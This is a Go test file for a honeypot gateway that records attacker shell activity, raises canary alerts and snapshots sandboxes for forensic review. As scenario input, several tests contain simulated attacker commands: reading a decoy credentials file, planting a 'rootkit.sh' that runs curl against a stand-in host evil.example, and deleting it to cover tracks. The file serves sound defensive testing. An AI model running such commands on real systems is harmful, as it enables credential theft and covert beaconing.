// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestHoneypotRootfsDropAndForensicTrail(t *testing.T) {
	hp, err := newHoneypot(t.TempDir())
	if err != nil {
		t.Fatalf("newHoneypot: %v", err)
	}

	resp, err := hp.Interact("backdoor.sh", "#!/bin/sh\necho pwned", "echo hello_gvisor", "10.0.0.12")
	if err != nil {
		t.Fatalf("Interact: %v", err)
	}

	files := resp["files_in_rootfs_tmp"].(map[string]string)
	if files["backdoor.sh"] != "#!/bin/sh\necho pwned" {
		t.Fatalf("expected backdoor.sh in rootfs tmp, got %v", files)
	}
	if _, ok := files["payroll_db_credentials.env.bak"]; !ok {
		t.Fatalf("expected decoy credentials file to exist")
	}
	if _, ok := files["wire_transfer_batch_409.csv"]; !ok {
		t.Fatalf("expected decoy wire transfer file to exist")
	}

	stdout, _ := resp["stdout"].(string)
	if !strings.Contains(stdout, "hello_gvisor") {
		t.Fatalf("expected real shell stdout 'hello_gvisor', got %q", stdout)
	}

	events := resp["forensic_audit_trail"].([]ForensicEvent)
	if len(events) != 2 {
		t.Fatalf("expected 2 forensic events, got %d", len(events))
	}
}

func TestHoneypotShellVsForensicsSeparationAndRootfsDelta(t *testing.T) {
	hp, err := newHoneypot(t.TempDir())
	if err != nil {
		t.Fatalf("newHoneypot: %v", err)
	}
	mux := newMux(hp)

	// 1. Attacker hits /shell to exfiltrate credentials and plant rootkit.sh
	req1 := httptest.NewRequest(http.MethodGet, "/shell?cmd=cat+payroll_db_credentials.env.bak+%26%26+printf+'%23!/bin/sh%0Acurl+evil.example/beacon%0A'+>+rootkit.sh+%26%26+chmod+%2Bx+rootkit.sh", nil)
	rec1 := httptest.NewRecorder()
	mux.ServeHTTP(rec1, req1)
	if rec1.Code != http.StatusOK {
		t.Fatalf("GET /shell status = %d, body = %s", rec1.Code, rec1.Body.String())
	}

	bodyStr := rec1.Body.String()
	if strings.Contains(strings.ToLower(bodyStr), "honeypot") || strings.Contains(bodyStr, "forensic_audit_trail") {
		t.Fatalf("/shell leaked honeypot/forensic indicators to attacker: %s", bodyStr)
	}

	var shellResp AttackerShellResponse
	if err := json.Unmarshal(rec1.Body.Bytes(), &shellResp); err != nil {
		t.Fatalf("unmarshal /shell: %v", err)
	}
	if !strings.Contains(shellResp.Stdout, "Summer2026!Decoy") {
		t.Fatalf("expected decoy password in stdout, got %q", shellResp.Stdout)
	}

	// 2. SOC queries /forensics and sees ADDED rootkit.sh + CRITICAL Canary alert
	req2 := httptest.NewRequest(http.MethodGet, "/forensics", nil)
	rec2 := httptest.NewRecorder()
	mux.ServeHTTP(rec2, req2)
	if rec2.Code != http.StatusOK {
		t.Fatalf("GET /forensics status = %d", rec2.Code)
	}

	var forensics1 ForensicsResponse
	if err := json.Unmarshal(rec2.Body.Bytes(), &forensics1); err != nil {
		t.Fatalf("unmarshal /forensics: %v", err)
	}
	if len(forensics1.CanaryAlerts) < 2 {
		t.Fatalf("expected at least 2 canary alerts (cred exfil + payload planted), got %+v", forensics1.CanaryAlerts)
	}

	foundAdded := false
	for _, d := range forensics1.RootfsDelta {
		if d.Name == "rootkit.sh" && d.Status == "ADDED" {
			foundAdded = true
		}
	}
	if !foundAdded {
		t.Fatalf("expected rootkit.sh with status ADDED in rootfs_delta, got %+v", forensics1.RootfsDelta)
	}

	// 3. Attacker wipes tracks (rm -f rootkit.sh) -> /forensics reports rootkit.sh as DELETED
	req3 := httptest.NewRequest(http.MethodGet, "/shell?cmd=rm+-f+rootkit.sh", nil)
	rec3 := httptest.NewRecorder()
	mux.ServeHTTP(rec3, req3)

	req4 := httptest.NewRequest(http.MethodGet, "/forensics", nil)
	rec4 := httptest.NewRecorder()
	mux.ServeHTTP(rec4, req4)

	var forensics2 ForensicsResponse
	if err := json.Unmarshal(rec4.Body.Bytes(), &forensics2); err != nil {
		t.Fatalf("unmarshal /forensics after rm: %v", err)
	}
	foundDeleted := false
	for _, d := range forensics2.RootfsDelta {
		if d.Name == "rootkit.sh" && d.Status == "DELETED" {
			foundDeleted = true
		}
	}
	if !foundDeleted {
		t.Fatalf("expected rootkit.sh with status DELETED after rm -f, got %+v", forensics2.RootfsDelta)
	}
}

func TestHoneypotBackendLifecycleRevertAndClone(t *testing.T) {
	ctx := context.Background()
	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")

	actorA := "honeypot-203-0-113-5"
	if err := backend.EnsureActor(ctx, actorA); err != nil {
		t.Fatalf("EnsureActor: %v", err)
	}

	// Plant rootkit.sh and save snapshot v2
	_, forensics, err := backend.ExecShell(ctx, actorA, "printf '#!/bin/sh\necho beacon\n' > rootkit.sh && chmod +x rootkit.sh", "", "")
	if err != nil {
		t.Fatalf("ExecShell plant: %v", err)
	}
	if _, ok := forensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected rootkit.sh on disk after plant")
	}

	ver, err := backend.SaveActor(ctx, actorA, "Auto-Checkpoint: rootkit.sh planted")
	if err != nil {
		t.Fatalf("SaveActor: %v", err)
	}
	if ver < 2 {
		t.Fatalf("expected snapshot version >= 2, got %d", ver)
	}

	// Clone actorA into honeypot-forensic-lab before wipe
	clonedForensics, err := backend.CloneActor(ctx, actorA, "honeypot-forensic-lab", "tag-forensic-203")
	if err != nil {
		t.Fatalf("CloneActor: %v", err)
	}
	if _, ok := clonedForensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected cloned forensic lab actor to contain rootkit.sh")
	}

	// Attacker wipes rootkit.sh on actorA
	_, wipedForensics, err := backend.ExecShell(ctx, actorA, "rm -f rootkit.sh", "", "")
	if err != nil {
		t.Fatalf("ExecShell wipe: %v", err)
	}
	if _, ok := wipedForensics.FilesInRootfsTmp["rootkit.sh"]; ok {
		t.Fatalf("expected rootkit.sh to be deleted after rm -f")
	}

	// Revert actorA back to saved checkpoint -> rootkit.sh is restored!
	revertedForensics, err := backend.RevertActor(ctx, actorA, ver)
	if err != nil {
		t.Fatalf("RevertActor: %v", err)
	}
	if _, ok := revertedForensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected rootkit.sh to be restored after RevertActor, got %v", revertedForensics.FilesInRootfsTmp)
	}

	// Suspend actorA and wake it up via ExecShell -> verify worker pod IP migration
	if err := backend.SuspendActor(ctx, actorA); err != nil {
		t.Fatalf("SuspendActor: %v", err)
	}
	_, migratedForensics, err := backend.ExecShell(ctx, actorA, "ls -la", "", "")
	if err != nil {
		t.Fatalf("ExecShell after suspend: %v", err)
	}
	if len(migratedForensics.PodIPHistory) < 2 {
		t.Fatalf("expected PodIPHistory length >= 2 after suspend + wakeup migration, got %v", migratedForensics.PodIPHistory)
	}
}

func TestHoneypotGatewayAutoCheckpointRevertAndClone(t *testing.T) {
	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")
	gw := NewGatewayServer(backend)
	srv := httptest.NewServer(gw.Mux())
	defer srv.Close()

	// 1. Verify GET / returns Split-Screen Truman Show HTML UI
	respUI, err := http.Get(srv.URL + "/")
	if err != nil {
		t.Fatalf("GET /: %v", err)
	}
	defer respUI.Body.Close()
	if respUI.StatusCode != http.StatusOK {
		t.Fatalf("GET / status = %d", respUI.StatusCode)
	}

	// 2. Plant rootkit.sh via /api/attacker/exec -> triggers Auto-Checkpoint!
	execBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"printf '#!/bin/sh\ncurl -s https://evil.example/beacon\n' > rootkit.sh && chmod +x rootkit.sh && ls -la"}`
	respExec, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(execBody))
	if err != nil {
		t.Fatalf("POST /api/attacker/exec: %v", err)
	}
	defer respExec.Body.Close()
	var execResult GatewayActionResponse
	if err := json.NewDecoder(respExec.Body).Decode(&execResult); err != nil {
		t.Fatalf("decode execResult: %v", err)
	}
	if !execResult.AutoCheckpointed || execResult.SnapshotVersion < 2 {
		t.Fatalf("expected AutoCheckpointed=true and SnapshotVersion>=2, got %+v", execResult)
	}
	savedVer := execResult.SnapshotVersion

	// 3. Attacker runs rm -f rootkit.sh -> should NOT overwrite the pre-wipe checkpoint
	wipeBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"rm -f rootkit.sh"}`
	respWipe, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(wipeBody))
	if err != nil {
		t.Fatalf("POST /api/attacker/exec wipe: %v", err)
	}
	defer respWipe.Body.Close()
	var wipeResult GatewayActionResponse
	if err := json.NewDecoder(respWipe.Body).Decode(&wipeResult); err != nil {
		t.Fatalf("decode wipeResult: %v", err)
	}
	if wipeResult.AutoCheckpointed {
		t.Fatalf("expected AutoCheckpointed=false on destructive rm command")
	}

	// 4. SOC calls /api/soc/revert to undo rm -f and recover rootkit.sh
	revertBody := `{"actor_name":"honeypot-203-0-113-5","target_version":` + strings.TrimSpace(jsonNumber(savedVer)) + `}`
	respRev, err := http.Post(srv.URL+"/api/soc/revert", "application/json", strings.NewReader(revertBody))
	if err != nil {
		t.Fatalf("POST /api/soc/revert: %v", err)
	}
	defer respRev.Body.Close()
	var revResult GatewayActionResponse
	if err := json.NewDecoder(respRev.Body).Decode(&revResult); err != nil {
		t.Fatalf("decode revResult: %v", err)
	}
	if _, ok := revResult.Forensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected rootkit.sh restored after /api/soc/revert, got %v", revResult.Forensics.FilesInRootfsTmp)
	}

	// 5. SOC calls /api/soc/clone to fork honeypot-forensic-lab
	cloneBody := `{"source_actor":"honeypot-203-0-113-5","new_actor":"honeypot-forensic-lab"}`
	respClone, err := http.Post(srv.URL+"/api/soc/clone", "application/json", strings.NewReader(cloneBody))
	if err != nil {
		t.Fatalf("POST /api/soc/clone: %v", err)
	}
	defer respClone.Body.Close()
	var cloneResult GatewayActionResponse
	if err := json.NewDecoder(respClone.Body).Decode(&cloneResult); err != nil {
		t.Fatalf("decode cloneResult: %v", err)
	}
	if _, ok := cloneResult.Forensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected rootkit.sh in cloned forensic lab actor")
	}

	// 6. Verify mutating /api/soc/* endpoints reject GET (405) and malformed JSON (400)
	for _, ep := range []string{"/api/soc/save", "/api/soc/suspend", "/api/soc/revert", "/api/soc/clone"} {
		respGet, err := http.Get(srv.URL + ep)
		if err != nil {
			t.Fatalf("GET %s: %v", ep, err)
		}
		respGet.Body.Close()
		if respGet.StatusCode != http.StatusMethodNotAllowed {
			t.Fatalf("GET %s status = %d, want %d", ep, respGet.StatusCode, http.StatusMethodNotAllowed)
		}
	}
	respBadJSON, err := http.Post(srv.URL+"/api/soc/save", "application/json", strings.NewReader("{bad"))
	if err != nil {
		t.Fatalf("POST /api/soc/save bad JSON: %v", err)
	}
	respBadJSON.Body.Close()
	if respBadJSON.StatusCode != http.StatusBadRequest {
		t.Fatalf("POST /api/soc/save bad JSON status = %d, want %d", respBadJSON.StatusCode, http.StatusBadRequest)
	}
}

func jsonNumber(n int) string {
	b, _ := json.Marshal(n)
	return string(b)
}

func TestHoneypotGatewayOneWayMirrorUIDesign(t *testing.T) {
	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")
	gw := NewGatewayServer(backend)
	srv := httptest.NewServer(gw.Mux())
	defer srv.Close()

	resp, err := http.Get(srv.URL + "/")
	if err != nil {
		t.Fatalf("GET /: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("GET / status = %d, want 200", resp.StatusCode)
	}
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read body: %v", err)
	}
	html := string(raw)

	requiredMarkers := []string{
		`id="movieSetPane"`,
		`id="oneWayMirror"`,
		`id="socBoothPane"`,
		`https://staging-admin.acmecorp.internal/admin/debug`,
		`id="actorTabs"`,
		`id="attackerTargetLabel"`,
		`id="terminalOutput"`,
		`id="customCmdInput"`,
		`id="checkpointToast"`,
		`id="socActorState"`,
		`id="socKernelProof"`,
		`id="socPodTrail"`,
		`id="socPodHopCount"`,
		`id="socSnapVer"`,
		`id="snapshotTimeline"`,
		`id="canaryBanner"`,
		`id="deltaTableBody"`,
		`id="payloadInspector"`,
		`id="inspectorFileTitle"`,
		`id="inspectorFileBody"`,
		`id="auditTrailBox"`,
		`socSave()`,
		`socSuspend()`,
		`socRevert()`,
		`socClone()`,
		`[data-theme="light"]`,
		`id="themeToggleBtn"`,
		`id="themeSegDark"`,
		`id="themeSegLight"`,
		`toggleTheme()`,
	}
	for _, marker := range requiredMarkers {
		if !strings.Contains(html, marker) {
			t.Errorf("GET / HTML missing required marker %q", marker)
		}
	}

	if strings.Contains(html, "themeToggleLabel") {
		t.Errorf("GET / HTML theme toggle must be icon-only without a text label that shifts layout")
	}

	if strings.Contains(html, ".innerHTML") {
		t.Errorf("GET / HTML script must use safe DOM APIs (textContent/replaceChildren/createElement) instead of .innerHTML")
	}
}


